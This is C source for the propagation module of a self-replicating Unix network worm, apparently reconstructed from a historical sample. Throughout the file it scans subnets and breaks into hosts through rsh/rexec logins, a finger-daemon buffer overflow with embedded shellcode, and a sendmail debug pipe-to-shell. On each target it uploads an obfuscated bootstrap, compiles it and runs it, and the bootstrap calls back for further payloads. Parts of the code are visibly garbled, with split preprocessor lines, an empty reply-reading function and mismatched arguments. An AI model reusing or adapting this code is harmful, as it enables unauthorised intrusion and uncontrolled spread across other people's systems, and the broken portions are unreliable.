#include "worm.h"
#include <stdio.h>
#include <strings.h>
#include <signal.h>
#include <errno.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/file.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>

extern struct hst* h_addr2host(), *h_name2host();
extern int justreturn();
extern int errno;
extern char *malloc();

int alarmed = 0;
int ngateways, *gateways;
struct hst *me, *hosts;

int nifs;
struct ifses ifs[30];

h_clean()
{
  struct hst *newhosts, *host, *next;

  newhosts = NULL;
  for (host = hosts; host != NULL; host = next)
  {
    next = host->next;
    host->flag &= -7;
    if (host == me || host->flag != 0)
    {
      host->next = newhosts;
      newhosts = host;
    }
    else
      free(host);
  }

  hosts = newhosts;
}

hg()
{
  struct hst * host;
  int i;

  rt_init();

  for (i = 0; i < ngateways; i++)
  {
    host = h_addr2host(gateways[i], 1);
    if (try_rsh_and_mail(host))
      return 1;
  }

  return 0;
}

ha()
{
  struct hst * host;
  int i, j, k;
  int l416[100];
  int l420;

  if (ngateways < 1)
    rt_init();
  j = 0;
  for (i = 0; i < ngateways; i++)
  {
    host = h_addr2host(gateways[i], 1);
    for (k = 0; k < 6; k++)
    {
      if (host->o48[k] == 0)
        continue;
      if (try_telnet_p(host->o48[k]) == 0)
        continue;
      l416[j] = host->o48[k];
      j++;
    }
  }

  permute(l416, j, sizeof(l416[0]));

  for (i = 0; i < j; i++)
  {
    if (hi_84(l416[i] &netmaskfor(l416[i])))
      return 1;
  }

  return 0;
}

hl()
{
  int i;

  for (i = 0; i < 6; i++)
  {
    if (me->o48[i] == 0)
      break;
    if (hi_84(me->o48[i] &netmaskfor(me->o48[i])) != 0)
      return 1;
  }

  return 0;
}

hi()
{
  struct hst * host;

  for (host = hosts; host; host = host->next)
    if ((host->flag &0x08 != 0) && (try_rsh_and_mail(host) != 0))
      return 1;
  return 0;
}

hi_84(arg1)
{
  int l4;
  struct hst * host;
  int l12, l16, l20, i, l28, adr_index, l36, l40, l44;
  int netaddrs[2048];

  l12 = netmaskfor(arg1);
  l16 = ~l12;

  for (i = 0; i < nifs; i++)
  {
    if (arg1 == (ifs[i].if_l24 &ifs[i].if_l16))
      return 0;
  }

  adr_index = 0;
  if (l16 == 0x0000ffff)
  {
    l44 = 4;
    for (l40 = 1; l40 < 255; l40++)
      for (l20 = 1; l20 <= 8; l20++)
        netaddrs[adr_index++] = arg1 | (l20 << 16) | l40;
    permute(netaddrs, adr_index, sizeof(netaddrs[0]));
  }
  else
  {
    l44 = 4;
    for (l20 = 1; l20 < 255; l20++)
      netaddrs[adr_index++] = (arg1 | l20);
    permute(netaddrs, 3* sizeof(netaddrs[0]), sizeof(netaddrs[0]));
    permute(netaddrs, adr_index - 6, 4);
  }

  if (adr_index > 20)
    adr_index = 20;
  for (l36 = 0; l36 < adr_index; l36++)
  {
    l4 = netaddrs[l36];
    host = h_addr2host(l4, 0);
    if (host == NULL || (host->flag &0x02) == 0)
      continue;
    if (host == NULL || (host->flag &0x04) == 0 ||
      command_port_p(l4, l44) == 0)
      continue;
    if (host == NULL)
      host = h_addr2host(l4, 1);
    if (try_rsh_and_mail(host))
      return 1;
  }

  return 0;
}

static command_port_p(addr, time)
u_long addr;
int time;
{
  int s, connection;
  struct sockaddr_in sin;
  int(*save_sighand)();

  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0)
    return 0;
  bzero(&sin, sizeof(sin));
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = addr;
  sin.sin_port = IPPORT_CMDSERVER;

  save_sighand = signal(SIGALRM, justreturn);

  if (time < 1)
    time = 1;
  alarm(time);
  connection = connect(s, &sin, sizeof(sin));
  alarm(0);

  close(s);

  if (connection < 0 && errno == ENETUNREACH)
    error("Network unreachable");
  return connection != -1;
}

static try_telnet_p(addr)
u_long addr;
{
  int s, connection;
  struct sockaddr_in sin;
  int(*save_sighand)();

  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0)
    return 0;
  bzero(&sin, sizeof(sin));
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = addr;
  sin.sin_port = IPPORT_TELNET;

  save_sighand = signal(SIGALRM, justreturn);
  alarm(5);
  connection = connect(s, &sin, sizeof(sin));
  if (connection < 0 && errno == ECONNREFUSED)
    connection = 0;
  alarm(0);

  close(s);

  return connection != -1;
}

static try_rsh_and_mail(host)
struct hst * host;
{
  int fd1, fd2, result;

  if (host == me)
    return 0;
  if (host->flag &0x02)
    return 0;
  if (host->flag &0x04)
    return 0;
  if (host->o48[0] == 0 || host->hostname == NULL)
    getaddrs(host);
  if (host->o48[0] == 0)
  {
    host->flag |= 0x04;
    return 0;
  }

  other_sleep(1);
  if (host->hostname &&
    fork_rsh(host->hostname, &fd1, &fd2,
      XS("exec /bin/sh")))
  {
    result = talk_to_sh(host, fd1, fd2);
    close(fd1);
    close(fd2);

    wait3((union wait *) NULL, WNOHANG, (struct rusage *) NULL);
    if (result != 0)
      return result;
  }

  if (try_finger(host, &fd1, &fd2))
  {
    result = talk_to_sh(host, fd1, fd2);
    close(fd1);
    close(fd2);
    if (result != 0)
      return result;
  }

  if (try_mail(host))
    return 1;

  host->flag |= 4;
  return 0;
}

static talk_to_sh(host, fdrd, fdwr)
struct hst * host;
int fdrd, fdwr;
{
  object * objectptr;
  char send_buf[512];
  char print_buf[52];
  int l572, l576, l580, l584, l588, l592;

  objectptr = getobjectbyname(XS("l1.c"));

  if (objectptr == NULL)
    return 0;
  if (makemagic(host, &l592, &l580, &l584, &l588) == 0)
    return 0;
  send_text(fdwr, XS("PATH=/bin:/usr/bin:/usr/ucb\n"));
  send_text(fdwr, XS("cd /usr/tmp\n"));
  l576 = random() % 0x00FFFFFF;

  sprintf(print_buf, XS("x%d.c"), l576);

  sprintf(send_buf, XS("echo gorch49;sed \'/int zz;/q\' > %s;echo gorch50\n"),
    print_buf);

  send_text(fdwr, send_buf);

  wait_for(fdrd, XS("gorch49"), 10);

  xorbuf(objectptr->buf, objectptr->size);
  l572 = write(fdwr, objectptr->buf, objectptr->size);
  xorbuf(objectptr->buf, objectptr->size);

  if (l572 != objectptr->size)
  {
    close(l588);
    return 0;
  }

  send_text(fdwr, XS("int zz;\n\n"));
  wait_for(fdrd, XS("gorch50"), 30);

  #
  define COMPILE "cc -o x%d x%d.c;./x%d %s %d %d;rm -f x%d x%d.c;echo DONE\n"
  sprintf(send_buf, XS(COMPILE), l576, l576, l576,
    inet_ntoa(a2in(l592)), l580, l584, l576, l576);

  send_text(fdwr, send_buf);

  if (wait_for(fdrd, XS("DONE"), 100) == 0)
  {
    close(l588);
    return 0;
  }

  return waithit(host, l592, l580, l584, l588);
}

makemagic(arg8, arg12, arg16, arg20, arg24)
struct hst * arg8;
int *arg12, *arg16, *arg20, *arg24;
{
  int s, i, namelen;
  struct sockaddr_in sin0, sin1;

  *arg20 = random() &0x00ffffff;
  bzero(&sin1, sizeof(sin1));
  sin1.sin_addr.s_addr = me->l12;

  for (i = 0; i < 6; i++)
  {
    if (arg8->o48[i] == NULL)
      continue;
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
      return 0;
    bzero(&sin0, sizeof(sin0));
    sin0.sin_family = AF_INET;
    sin0.sin_port = IPPORT_TELNET;
    sin0.sin_addr.s_addr = arg8->o48[i];
    errno = 0;
    if (connect(s, &sin0, sizeof(sin0)) != -1)
    {
      namelen = sizeof(sin1);
      getsockname(s, &sin1, &namelen);
      close(s);
      break;
    }

    close(s);
  }

  *arg12 = sin1.sin_addr.s_addr;

  for (i = 0; i < 1024; i++)
  {
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
      return 0;
    bzero(&sin0, sizeof(sin0));
    sin0.sin_family = AF_INET;
    sin0.sin_port = random() % 0xffff;
    if (bind(s, &sin0, sizeof(sin0)) != -1)
    {
      listen(s, 10);
      *arg16 = sin0.sin_port;
      *arg24 = s;
      return 1;
    }

    close(s);
  }

  return 0;
}

waithit(host, arg1, arg2, key, arg4)
struct hst * host;
{
  int(*save_sighand)();
  int l8, sin_size, l16, i, l24, l28;
  struct sockaddr_in sin;
  object * obj;
  char files[20][128];
  char *l2612;
  char strbuf[512];

  save_sighand = signal(SIGPIPE, justreturn);

  sin_size = sizeof(sin);
  alarm(2 *60);
  l8 = accept(arg4, &sin, &sin_size);
  alarm(0);

  if (l8 < 0)
    goto quit;
  if (xread(l8, &l16, sizeof(l16), 10) != 4)
    goto quit;
  l16 = ntohl(l16);
  if (key != l16)
    goto quit;
  for (i = 0; i < nobjects; i++)
  {
    obj = &objects[i];
    l16 = htonl(obj->size);
    write(l8, &l16, sizeof(l16));
    sprintf(files[i], XS("x%d,%s"),
      (random() &0x00ffffff), obj->name);
    write(l8, files[i], sizeof(files[0]));
    xorbuf(obj->buf, obj->size);
    l24 = write(l8, obj->buf, obj->size);
    xorbuf(obj->buf, obj->size);
    if (l24 != obj->size)
      goto quit;
  }

  l16 = -1;
  if (write(l8, &l16, sizeof(l16)) != 4)
    goto quit;

  sleep(4);

  if (test_connection(l8, l8, 30) == 0)
    goto quit;
  send_text(l8, XS("PATH=/bin:/usr/bin:/usr/ucb\n"));
  send_text(l8, XS("rm -f sh\n"));

  sprintf(strbuf, XS("if[ -f sh ]\nthen\nP=x%d\nelse\nP=sh\nfi\n"),
    random() &0x00ffffff);
  send_text(l8, strbuf);

  for (i = 0; i < nobjects; i++)
  {
    if ((l2612 = index(files[i], '.')) == NULL ||
      l2612[1] != 'o')
      continue;
    sprintf(strbuf, XS("cc -o $P %s\n"), files[i]);
    send_text(l8, strbuf);
    if (test_connection(l8, l8, 30) == 0)
      goto quit;
    sprintf(strbuf, XS("./$P -p $$ "));
    for (l28 = 0; l28 < nobjects; l28++)
    {
      strcat(strbuf, files[l28]);
      strcat(strbuf, XS(" "));
    }

    strcat(strbuf, XS("\n"));
    send_text(l8, strbuf);
    if (test_connection(l8, l8, 10) == 0)
    {
      close(l8);
      close(arg4);
      host->flag |= 2;
      return 1;
    }

    send_text(l8, XS("rm -f $P\n"));
  }

  for (i = 0; i < nobjects; i++)
  {
    sprintf(strbuf, XS("rm -f %s $P\n"), files[i]);
    send_text(l8, strbuf);
  }

  test_connection(l8, l8, 5);
  quit:
    close(l8);
  close(l24);
  return 0;
}

static compile_slave(host, s, arg16, arg20, arg24)
struct hst host;
{
  object * obj;
  char buf[512];
  char cfile[56];
  int wr_len, key;

  obj = getobjectbyname(XS("l1.c"));
  if (obj == NULL)
    return 0;
  send_text(s, XS("cd /usr/tmp\n"));

  key = (random() % 0x00ffffff);
  sprintf(cfile, XS("x%d.c"), key);
  sprintf(buf, XS("cat > %s <<\'EOF\'\n"), cfile);
  send_text(s, buf);

  xorbuf(obj->buf, obj->size);
  wr_len = write(s, obj->buf, obj->size);
  xorbuf(obj->buf, obj->size);

  if (wr_len != obj->size)
    return 0;
  send_text(s, XS("EOF\n"));

  sprintf(buf, XS("cc -o x%d x%d.c;x%d %s %d %d;rm -f x%d x%d.c\n"),
    key, key, key,
    inet_ntoa(a2in(arg16, arg20, arg24, key, key)->baz));
  return send_text(s, buf);
}

static send_text(fd, str)
char *str;
{
  write(fd, str, strlen(str));
}

static fork_rsh(host, fdp1, fdp2, str)
char *host;
int *fdp1, *fdp2;
char *str;
{
  int child;
  int fildes[2];
  int fildes1[2];
  int fd;

  if (pipe(fildes) < 0)
    return 0;
  if (pipe(fildes1) < 0)
  {
    close(fildes[0]);
    close(fildes[1]);
    return 0;
  }

  child = fork();
  if (child < 0)
  {
    close(fildes[0]);
    close(fildes[1]);
    close(fildes1[0]);
    close(fildes1[1]);
    return 0;
  }

  if (child == 0)
  {
    for (fd = 0; fd < 32; fd++)
      if (fd != fildes[0] &&
        fd != fildes1[1] &&
        fd != 2)
        close(fd);
    dup2(fildes[0], 0);
    dup2(fildes[1], 1);
    if (fildes[0] > 2)
      close(fildes[0]);
    if (fildes1[1] > 2)
      close(fildes1[1]);

    execl(XS("/usr/ucb/rsh"), XS("rsh"), host, str, 0);
    execl(XS("/usr/bin/rsh"), XS("rsh"), host, str, 0);
    execl(XS("/bin/rsh"), XS("rsh"), host, str, 0);
    exit(1);
  }

  close(fildes[0]);
  close(fildes1[1]);
  *fdp1 = fildes1[0];
  *fdp2 = fildes[1];

  if (test_connection(*fdp1, *fdp2, 30))
    return 1;
  close(*fdp1);
  close(*fdp2);
  kill(child, 9);

  sleep(1);
  wait3(0, WNOHANG, 0);
  return 0;
}

static test_connection(rdfd, wrfd, time)
int rdfd, wrfd, time;
{
  char combuf[100], numbuf[100];

  sprintf(numbuf, XS("%d"), random() &0x00ffffff);
  sprintf(combuf, XS("\n/bin/echo %s\n"), numbuf);
  send_text(wrfd, combuf);
  return wait_for(rdfd, numbuf, time);
}

static wait_for(fd, str, time)
int fd, time;
char *str;
{
  char buf[512];
  int i, length;

  length = strlen(str);
  while (x488e(fd, buf, sizeof(buf), time) == 0)
  {
    for (i = 0; buf[i]; i++)
    {
      if (strncmp(str, &buf[i], length) == 0)
        return 1;
    }
  }

  return 0;
}

justreturn(sig, code, scp)
int sig, code;
struct sigcontext * scp;
{
  alarmed = 1;
}

static x488e(fd, buf, num_chars, maxtime)
int fd, num_chars, maxtime;
char *buf;
{
  int i, l8, readfds;
  struct timeval timeout;

  for (i = 0; i < num_chars; i++)
  {
    readfds = 1 << fd;
    timeout.tv_usec = maxtime;
    timeout.tv_sec = 0;
    if (select(fd + 1, &readfds, 0, 0, &timeout) <= 0)
      return 0;
    if (readfds == 0)
      return 0;
    if (read(fd, &buf[i], 1) != 1)
      return 0;
    if (buf[i] == '\n')
      break;
  }

  buf[i] = '\0';
  if (i > 0 && l8 > 0)
    return 1;
  return 0;
}

static char *movstr(arg0, arg1)
char *arg0, *arg1;
{
  arg1[0] = '\0';
  if (arg0 == 0)
    return 0;
  while (!isspace(*arg0))
    arg0++;

  if (*arg0 == '\0')
    return 0;
  while (*arg0)
  {
    if (isspace(*arg0)) break;
    *arg1++ = *arg0++;
  }

  *arg1 = '\0';
  return arg0;
}

static try_finger(host, fd1, fd2)
struct hst * host;
int *fd1, *fd2;
{
  int i, j, l12, l16, s;
  struct sockaddr_in sin;
  char unused[492];
  int l552, l556, l560, l564, l568;
  char buf[536];
  int(*save_sighand)();

  save_sighand = signal(SIGALRM, justreturn);

  for (i = 0; i < 6; i++)
  {
    if (host->o48[i] == 0)
      continue;
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
      continue;
    bzero(&sin, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = host->o48[i];
    sin.sin_port = IPPORT_FINGER;

    alarm(10);
    if (connect(s, &sin, sizeof(sin)) < 0)
    {
      alarm(0);
      close(s);
      continue;
    }

    alarm(0);
    break;
  }

  if (i >= 6)
    return 0;
  for (i = 0; i < 536; i++)
    buf[i] = '\0';
  for (i = 0; i < 400; i++)
    buf[i] = 1;
  for (j = 0; j < 28; j++)
    buf[i + j] = "\335\217/sh\0\335\217/bin\320^Z\335\0\335\0\335Z\335\003\320^\\\274;\344\371\344\342\241\256\343\350\357\256\362\351"[j];

  l556 = 0x7fffe9fc;
  l560 = 0x7fffe8a8;
  l564 = 0x7fffe8bc;
  l568 = 0x28000000;
  l552 = 0x0001c020;

  #
  ifdef sun
  l556 = byte_swap(l556);
  l560 = byte_swap(l560);
  l564 = byte_swap(l564);
  l568 = byte_swap(l568);
  l552 = byte_swap(l552);#
  endif sun

  write(s, buf, sizeof(buf));
  write(s, XS("\n"), 1);
  sleep(5);
  if (test_connection(s, s, 10))
  {
    *fd1 = s;
    *fd2 = s;
    return 1;
  }

  close(s);
  return 0;
}

static byte_swap(arg)
int arg;
{
  int i, j;

  i = 0;
  j = 0;
  while (j < 4)
  {
    i = i << 8;
    i |= (arg & 0xff);
    arg = arg >> 8;
    j++;
  }

  return i;
}

permute(ptr, num, size)
char *ptr;
int num, size;
{
  int i, newloc;
  char buf[512];

  for (i = 0; i < num * size; i += size)
  {
    newloc = size *(random() % num);
    bcopy(ptr + i, buf, size);
    bcopy(ptr + newloc, ptr + i, size);
    bcopy(buf, ptr + newloc, size);
  }
}

static try_mail(host)
struct hst * host;
{
  int i, l8, l12, l16, s;
  struct sockaddr_in sin;
  char l548[512];
  int(*old_handler)();
  struct sockaddr saddr;
  int fd_tmp;
  old_handler = signal(SIGALRM, justreturn);
  for (i = 0; i < 6; i++)
  {
    if (host->o48[i] == NULL)
      continue;
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
      continue;

    bzero(&sin, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = host->o48[i];
    sin.sin_port = IPPORT_SMTP;

    alarm(10);
    if (connect(s, &sin, sizeof(sin)) < 0)
    {
      alarm(0);
      close(s);
      continue;
    }

    alarm(0);
    break;
  }

  if (i < 6)
    return 0;
  if (x50bc(s, l548) != 0 || l548[0] != '2')
    goto bad;

  send_text(s, XS("debug"));
  if (x50bc(s, l548) != 0 || l548[0] != '2')
    goto bad;

  #
  define MAIL_FROM "mail from:</dev/null>\n"#
  define MAIL_RCPT "rcpt to:<\"| sed \'1,/^$/d\' | /bin/sh ; exit 0\">\n"

  send_text(s, XS(MAIL_FROM));
  if (x50bc(s, l548) != 0 || l548[0] != '2')
    goto bad;
  i = (random() &0x00FFFFFF);

  sprintf(l548, XS(MAIL_RCPT), i, i);
  send_text(s, l548);
  if (x50bc(s, l548) != 0 || l548[0] != '2')
    goto bad;

  send_text(s, XS("data\n"));
  if (x50bc(s, l548) == 0 || l548[0] != '3')
    goto bad;

  send_text(s, XS("data\n"));

  compile_slave(host, s, saddr);

  send_text(s, XS("\n.\n"));

  if (x50bc(s, l548) == 0 || l548[0] != '2')
  {
    close(fd_tmp);
    goto bad;
  }

  send_text(s, XS("quit\n"));
  if (x50bc(s, l548) == 0 || l548[0] != '2')
  {
    close(fd_tmp);
    goto bad;
  }

  close(s);
  return waithit(host, saddr);
  bad:
    send_text(s, XS("quit\n"));
  x50bc(s, l548);
  close(s);
  return 0;
}

static x50bc(s, buffer)
int s;
char *buffer; {}

hu1(alt_username, host, username2)
char *alt_username, *username2;
struct hst * host;
{
  char username[256];
  char buffer2[512];
  char local[8];
  int result, i, fd_for_sh;

  if (host == me)
    return 0;
  if (host->flag &HST_HOSTTWO)
    return 0;

  if (host->o48[0] || host->hostname == NULL)
    getaddrs(host);
  if (host->o48[0] == 0)
  {
    host->flag |= HST_HOSTFOUR;
    return 0;
  }

  strncpy(username, username2, sizeof(username) - 1);
  username[sizeof(username) - 1] = '\0';

  if (username[0] == '\0')
    strcpy(username, alt_username);

  for (i = 0; username[i]; i++)
    if (ispunct(username[i]) || username[i]<' ')
      return 0;
  other_sleep(1);

  fd_for_sh = x538e(host, username, &alt_username[30]);
  if (fd_for_sh >= 0)
  {
    result = talk_to_sh(host, fd_for_sh, fd_for_sh);
    close(fd_for_sh);
    return result;
  }

  if (fd_for_sh == -2)
    return 0;

  fd_for_sh = x538e(me, alt_username, &alt_username[30]);
  if (fd_for_sh >= 0)
  {
    sprintf(buffer2, XS("exec /usr/ucb/rsh %s -l %s \'exec /bin/sh\'\n"),
      host->hostname, username);
    send_text(fd_for_sh, buffer2);
    sleep(10);
    result = 0;
    if (test_connection(fd_for_sh, fd_for_sh, 25))
      result = talk_to_sh(host, fd_for_sh, fd_for_sh);
    close(fd_for_sh);
    return result;
  }

  return 0;
}

static int x538e(host, name1, name2)
struct hst * host;
char *name1, *name2;
{
  int s, i;
  struct sockaddr_in sin;
  int l6, l7;
  char in_buf[512];

  for (i = 0; i < 6; i++)
  {
    if (host->o48[i] == 0)
      continue;
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
      continue;

    bzero(&sin, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = host->o48[i];
    sin.sin_port = IPPORT_EXECSERVER;

    alarm(8);
    signal(SIGALRM, justreturn);
    if (connect(s, &sin, sizeof(sin)) < 0)
    {
      alarm(0);
      close(s);
      continue;
    }

    alarm(0);
    break;
  }

  if (i >= 6)
    return -2;

  if (write(s, XS(""), 1) == 1)
  {
    write(s, name1, strlen(name1) + 1);
    write(s, name2, strlen(name2) + 1);
    if ((write(s, XS("/bin/sh"), strlen(XS("/bin/sh")) + 1) >= 0) &&
      xread(s, in_buf, 1, 20) == 1 &&
      in_buf[0] == '\0' &&
      test_connection(s, s, 40) != 0)
      return s;
  }

  close(s);
  return -1;
}

loadobject(obj_name)
char *obj_name;
{
  int fd;
  unsigned long size;
  struct stat statbuf;
  char *object_buf, *suffix;
  char local[4];

  fd = open(obj_name, O_RDONLY);
  if (fd < 0)
    return 0;
  if (fstat(fd, &statbuf) < 0)
  {
    close(fd);
    return 0;
  }

  size = statbuf.st_size;
  object_buf = malloc(size);
  if (object_buf == 0)
  {
    close(fd);
    return 0;
  }

  if (read(fd, object_buf, size) != size)
  {
    free(object_buf);
    close(fd);
    return 0;
  }

  close(fd);
  xorbuf(object_buf, size);
  suffix = index(obj_name, ',');
  if (suffix != NULL)
    suffix += 1;
  else
    suffix = obj_name;
  objects[nobjects].name = strcpy(malloc(strlen(suffix) + 1), suffix);
  objects[nobjects].size = size;
  objects[nobjects].buf = object_buf;
  nobjects += 1;
  return 1;
}

object* getobjectbyname(name)
char *name;
{
  int i;

  for (i = 0; i < nobjects; i++)
    if (strcmp(name, objects[i].name) == 0)
      return &objects[i];
  return NULL;
}

xorbuf(buf, size)
char *buf;
unsigned long size;
{
  char *addr_self;
  int i;

  addr_self = (char*) xorbuf;
  i = 0;
  while (size-- > 0)
  {
    *buf++ ^= addr_self[i];
    i = (i + 1) % 10;
  }

  return;
}

static other_fd = -1;

checkother()
{
  int s, l8, l12, l16, optval;
  struct sockaddr_in sin;

  optval = 1;
  if ((random() % 7) == 3)
    return;

  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0)
    return;

  bzero(&sin, sizeof(sin));
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = inet_addr(XS("127.0.0.1"));
  sin.sin_port = 0x00005b3d;

  if (connect(s, &sin, sizeof(sin)) < 0)
  {
    close(s);
  }
  else
  {
    l8 = MAGIC_2;
    if (write(s, &l8, sizeof(l8)) != sizeof(l8))
    {
      close(s);
      return;
    }

    l8 = 0;
    if (xread(s, &l8, sizeof(l8), 5 *60) != sizeof(l8))
    {
      close(s);
      return;
    }

    if (l8 != MAGIC_1)
    {
      close(s);
      return;
    }

    l12 = random() / 8;
    if (write(s, &l12, sizeof(l12)) != sizeof(l12))
    {
      close(s);
      return;
    }

    if (xread(s, &l16, sizeof(l16), 10) != sizeof(l16))
    {
      close(s);
      return;
    }

    if (!((l12 + l16) % 2))
      pleasequit++;
    close(s);
  }

  sleep(5);

  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0)
    return;

  setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
  if (bind(s, &sin, sizeof(sin)) < 0)
  {
    close(s);
    return;
  }

  listen(s, 10);

  other_fd = s;
  return;
}

other_sleep(how_long)
{
  int nfds, readmask;
  long time1, time2;
  struct timeval timeout;

  if (other_fd < 0)
  {
    if (how_long != 0)
      sleep(how_long);
    return;
  }

  do {
    if (other_fd < 0)
      return;
    readmask = 1 << other_fd;
    if (how_long < 0)
      how_long = 0;

    timeout.tv_sec = how_long;
    timeout.tv_usec = 0;

    if (how_long != 0)
      time(&time1);
    nfds = select(other_fd + 1, &readmask, 0, 0, &timeout);
    if (nfds < 0)
      sleep(1);
    if (readmask != 0)
      answer_other();
    if (how_long != 0)
    {
      time(&time2);
      how_long -= time2 - time1;
    }
  } while (how_long > 0);
  return;
}

static answer_other()
{
  int ns, addrlen, magic_holder, magic1, magic2;
  struct sockaddr_in sin;

  addrlen = sizeof(sin);

  ns = accept(other_fd, &sin, &addrlen);

  if (ns < 0)
    return;

  magic_holder = MAGIC_1;
  if (write(ns, &magic_holder, sizeof(magic_holder)) != sizeof(magic_holder))
  {
    close(ns);
    return;
  }

  if (xread(ns, &magic_holder, sizeof(magic_holder), 10) != sizeof(magic_holder))
  {
    close(ns);
    return;
  }

  if (magic_holder != MAGIC_2)
  {
    close(ns);
    return;
  }

  magic1 = random() / 8;
  if (write(ns, &magic1, sizeof(magic1)) != sizeof(magic1))
  {
    close(ns);
    return;
  }

  if (xread(ns, &magic2, sizeof(magic2), 10) != sizeof(magic2))
  {
    close(ns);
    return;
  }

  close(ns);

  if (sin.sin_addr.s_addr != inet_addr(XS("127.0.0.1")))
    return;

  if (((magic1 + magic2) % 2) != 0)
  {
    close(other_fd);
    other_fd = -1;
    pleasequit++;
  }

  return;
}

xread(fd, buf, length, time)
int fd, time;
char *buf;
unsigned long length;
{
  int i, cc, readmask;
  struct timeval timeout;
  int nfds;
  long time1, time2;

  for (i = 0; i < length; i++)
  {
    readmask = 1 << fd;
    timeout.tv_sec = time;
    timeout.tv_usec = 0;
    if (select(fd + 1, &readmask, 0, 0, &timeout) < 0)
      return 0;
    if (readmask == 0)
      return 0;
    if (read(fd, &buf[i], 1) != 1)
      return 0;
  }

  return i;
}

#ifdef notdef
char environ[50] = "";
char *sh = "sh";
char *env52 = "sh";
char *env55 = "-p";
char *env58 = "l1.c";
char *env63 = "sh";
char *env66 = "/tmp/.dump";
char *env77 = "128.32.137.13";
char *env91 = "127.0.0.1";
char *env102 = "/usr/ucb/netstat -r -n";
char *env125 = "r";
char *env127 = "%s%s";
#endif
